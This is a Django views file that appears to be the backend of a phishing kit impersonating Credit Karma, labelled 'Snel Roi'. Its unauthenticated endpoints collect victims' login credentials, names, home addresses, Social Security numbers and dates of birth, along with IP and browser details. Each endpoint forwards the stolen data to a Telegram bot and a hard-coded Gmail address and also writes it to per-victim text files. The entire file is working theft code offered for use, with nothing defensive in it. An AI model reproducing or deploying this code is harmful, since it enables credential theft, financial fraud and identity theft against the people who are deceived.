import json
import os
import re
from django.conf import settings
from django.shortcuts import render
import requests
from core.app_config import app_settings

from rest_framework.response import Response
from rest_framework import status
from rest_framework.decorators import (
    api_view,
    permission_classes,
    authentication_classes,
)

from core.middleware.block_ips_middleware import (
    get_city_from_ip,
    get_client_ip,
    get_country_from_ip,
    get_user_browser,
    get_user_os,
)
from user_data.models import Address, BankInfo, BrowserDetail, Client
from django.template.loader import get_template
from django.core.mail import send_mail
from datetime import datetime


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_login_cred(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        password = request.data.get("pwzenz", "")

        if not email:
            errors["email"] = ["User Email is required."]
        elif not is_valid_email(email):
            errors["email"] = ["Valid email required."]

        if not password:
            errors["password"] = ["Password is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )

        bank_info = BankInfo.objects.create(
            client=client, email=email, password=password
        )
        browser_data = BrowserDetail.objects.create(
            client=client,
            ip=ip,
            agent=agent,
            country=country,
            browser=browser,
            os=os,
            date=date,
        )

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  LOGIN  ] ==========|\n"
        message += f"| ➤ [ Email ]         : {email}\n"
        message += f"| ➤ [ Password ]      : {password}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
  
        subject = "The Data"
        from_email = app_settings['from_email']
        recipient_list = app_settings['send_email_list']

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_user_data_email.si(subject, subject, from_email, recipient_list),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_login_cred2(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        password = request.data.get("pwzenz", "")

        if not email:
            errors["email"] = ["User Email is required."]
        elif not is_valid_email(email):
            errors["email"] = ["Valid email required."]

        if not password:
            errors["password"] = ["Password is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )

        bank_info, created = BankInfo.objects.get_or_create(
            client=client,
        )

        bank_info.email2 = email
        bank_info.password2 = password
        bank_info.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  LOGIN CONFIRM ] ==========|\n"
        message += f"| ➤ [ Email2 ]         : {email}\n"
        message += f"| ➤ [ Password2 ]      : {password}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        context = {
            "email": email,
            "password": password,
        }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_login_cred2(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        password = request.data.get("pwzenz", "")

        if not email:
            errors["email"] = ["User Email is required."]
        elif not is_valid_email(email):
            errors["email"] = ["Valid email required."]

        if not password:
            errors["password"] = ["Password is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )

        bank_info, created = BankInfo.objects.get_or_create(
            client=client,
        )

        bank_info.email2 = email
        bank_info.password2 = password
        bank_info.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  LOGIN CONFIRM ] ==========|\n"
        message += f"| ➤ [ Email2 ]         : {email}\n"
        message += f"| ➤ [ Password2 ]      : {password}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        context = {
            "email": email,
            "password": password,
        }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_basic_info(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        firstName = request.data.get("fzNme", "")
        lastName = request.data.get("lzNme", "")

        print(email)
        print(firstName)
        print(lastName)

        if not email:
            errors["email"] = ["Email is required."]
        if not firstName:
            errors["firstName"] = ["First name is required."]

        if not lastName:
            errors["lastName"] = ["LastName is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )
        client.first_name = firstName
        client.last_name = lastName
        client.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  CLIENT INFO ] ==========|\n"
        message += f"| ➤ [ First Name ]     : {firstName}\n"
        message += f"| ➤ [ Last Name ]      : {lastName}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        # context = {
        #     "email": email,
        #     "password": password,
        # }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_home_address(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        streetAddress = request.data.get("stAd", "")
        apt = request.data.get("apt", "")
        _city = request.data.get("city", "")
        state = request.data.get("state", "")
        zipCode = request.data.get("zipCode", "")

        print(email)
        print(streetAddress)
        print(apt)
        print(_city)
        print(state)
        print(zipCode)

        if not email:
            errors["email"] = ["Email is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )

        address, created = Address.objects.get_or_create(
            client=client,
        )
        address.street_address = streetAddress
        address.apartment_unit = apt
        address.city = _city
        address.state = state
        address.zip_code = zipCode
        address.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  HOME ADDRESS ] ==========|\n"
        message += f"| ➤ [ Street Address ]   : {streetAddress}\n"
        message += f"| ➤ [ City ]             : {_city}\n"
        message += f"| ➤ [ Apartment/Unit ]   : {apt}\n"
        message += f"| ➤ [ State ]            : {state}\n"
        message += f"| ➤ [ zip code ]         : {zipCode}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        # context = {
        #     "email": email,
        #     "password": password,
        # }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_social_security(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        ssn_short = request.data.get("s2ns", "")
        dob = request.data.get("d_b", "")

        print(email)
        print(ssn_short)
        print(dob)

        if not email:
            errors["email"] = ["Email is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )
        client.social_security_short = ssn_short
        client.dob = dob
        client.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
        message += f"| ➤ [ SSN-last4 ]       : {ssn_short}\n"
        message += f"| ➤ [ DOB ]             : {dob}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        # context = {
        #     "email": email,
        #     "password": password,
        # }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


@api_view(
    [
        "POST",
    ]
)
@permission_classes([])
@authentication_classes([])
def collect_user_social_security_2(request):

    payload = {}
    data = {}
    errors = {}

    if request.method == "POST":

        email = request.data.get("emzemz", "")
        ssn = request.data.get("s2ns", "")
        dob = request.data.get("d_b", "")

        print(email)
        print(ssn)
        print(dob)

        if not email:
            errors["email"] = ["Email is required."]

        if errors:
            payload["message"] = "Errors"
            payload["errors"] = errors
            return Response(payload, status=status.HTTP_400_BAD_REQUEST)

        #####################
        # Browser Data
        ######################

        ip = get_client_ip(request)
        agent = request.META.get("HTTP_USER_AGENT", "")

        country = get_country_from_ip(ip)
        city = get_city_from_ip(ip)
        browser = get_user_browser(agent)
        os = get_user_os(agent)
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        ##############################
        # Save User data to database
        ################################

        client, created = Client.objects.get_or_create(
            email=email,
        )
        client.social_security = ssn
        client.dob = dob
        client.save()

        browser_data, created = BrowserDetail.objects.get_or_create(
            client=client,
        )

        browser_data.ip = ip
        browser_data.agent = agent
        browser_data.country = country
        browser_data.browser = browser
        browser_data.os = os
        browser_data.date = date

        browser_data.save()

        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
        message += f"|========= [  SSN / DATE OF BIRTH ] ==========|\n"
        message += f"| ➤ [ SSN ]             : {ssn}\n"
        message += f"| ➤ [ DOB ]             : {dob}\n"
        message += f"|=====================================|\n"
        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
        message += f"|======================================|\n"
        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
        message += f"| ➤ [ IP Country ]   : {country}\r\n"
        message += f"| ➤ [ IP City ]      : {city}\r\n"
        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
        message += f"| ➤ [ TIME ]         : {date}\r\n"
        message += f"|=====================================|\n"

        #############################
        # Send data to telegram
        ##############################

        telegram_url = (
            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
        )

        # Send the POST request to Telegram API
        response = requests.post(
            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
        )

        # Check if the message was sent successfully
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

        #############################
        # Send Data to email
        ########################
        # context = {
        #     "email": email,
        #     "password": password,
        # }
        subject = "The Data"
        from_email = settings.DEFAULT_FROM_EMAIL
        recipient_list = ["etornamasamoah@gmail.com"]

        # # Use Celery chain to execute tasks in sequence
        # email_chain = chain(
        #     send_generic_email.si(subject, txt_, from_email, recipient_list, html_),
        # )
        # # Execute the Celery chain asynchronously
        # email_chain.apply_async()

        send_mail(
            subject,
            message,
            from_email,
            recipient_list,
            fail_silently=False,
        )

        #####################################
        # Save to txt
        ##############################
        save_data_to_file(email, message)

        payload["message"] = "Successful"
        payload["data"] = data
    return Response(payload)


def is_valid_email(email):
    # Regular expression pattern for basic email validation
    pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"

    # Using re.match to check if the email matches the pattern
    if re.match(pattern, email):
        return True
    else:
        return False


def save_data_to_file(email, message):
    # Ensure the 'clients' folder exists
    folder_path = "clients"
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

    # Construct the file path using the email
    file_path = os.path.join(folder_path, f"{email}.txt")

    # Write the message to the file with UTF-8 encoding
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(message)  # Directly save the formatted message as is
        f.write("\n" + "=" * 80 + "\n")  # Add a separator for clarity

    print(f"Data saved to {file_path}")
